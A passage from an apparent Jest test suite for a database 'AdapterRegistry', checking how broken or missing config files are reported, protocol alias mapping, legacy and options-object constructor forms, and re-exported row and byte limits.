    test('a config that will not parse is reported, not thrown', () => {
      const dir = mkdtempSync(join(tmpdir(), 'anydb-broken-'));
      const file = join(dir, 'db.json');
      writeFileSync(file, '{ not json', 'utf8');
      const r = new AdapterRegistry({ env: { ANYDB_CONFIG: file } });

      const report = r.describeConfiguration();
      expect(report.profiles).toBe(0);
      expect(report.profilesError).toMatch(/not valid JSON/);
    });

    test('no config file at all is not an error', () => {
      const dir = mkdtempSync(join(tmpdir(), 'anydb-empty-'));
      const r = new AdapterRegistry({ env: { ANYDB_CONFIG: join(dir, 'absent.json') } });
      expect(r.describeConfiguration().profiles).toBe(0);
      expect(r.describeConfiguration().profilesError).toBeUndefined();
    });

    test('the schema table is derived from ROUTES', () => {
      expect(registry.protocolMap().get('mariadb')).toBe('mysql');
      expect(registry.protocolMap().get('mongodb+srv')).toBe('mongodb');
    });
  });

  describe('constructor', () => {
    test('accepts an options object', () => {
      const r = new AdapterRegistry({ env: { ANYDB_CACHE: '0' } });
      expect(r.env.ANYDB_CACHE).toBe('0');
      expect(r.cache.enabled).toBe(false);
    });

    test('still accepts the six positional arguments, for older callers', () => {
      const pool = () => {}; const client = () => {}; const database = () => {};
      const redis = () => {}; const mysql = () => {};
      const r = new AdapterRegistry(pool, client, database, redis, mysql);

      expect(r.poolClass).toBe(pool);
      expect(r.clientClass).toBe(client);
      expect(r.databaseClass).toBe(database);
      expect(r.redisClientClass).toBe(redis);
      expect(r.mysqlConnectionClass).toBe(mysql);
    });

    test('a ConnectionCache in first position is read as the legacy form', () => {
      const cache = new AdapterRegistry().cache;
      expect(new AdapterRegistry(cache).cache).toBe(cache);
    });
  });

  describe('result-limits re-exports', () => {
    test('the limits are reachable from the registry module', () => {
      expect(DEFAULT_MAX_ROWS).toBe(1000);
      expect(DEFAULT_MAX_BYTES).toBe(262144);
      expect(clampResult([{ a: 1 }], {}).rowCount).toBe(1);
      expect(resolvedTimezone()).toMatch(/^[+-]\d{2}:\d{2}$/);
    });
  });
});
